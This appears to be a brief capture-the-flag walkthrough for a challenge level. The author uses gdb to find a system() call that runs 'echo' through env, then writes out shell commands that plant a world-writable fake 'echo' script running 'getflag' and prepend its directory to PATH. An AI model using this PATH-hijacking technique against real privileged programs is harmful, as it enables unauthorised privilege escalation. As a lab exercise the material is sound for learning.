## Walkthrough :  
- i started debugging using gdb , and found a call to **system** function
- print the argument passed to system : *"/usr/bin/env echo Exploit me"*, it gets the program from the PATH
```
system : executes  a  command  specified in parameters
```
- so decided to change cancat my exploit to the path  
```
chmod 777 . && echo "getflag" >> echo && chmod 777 echo
```
```
export PATH=/home/user/level03/:$PATH
```
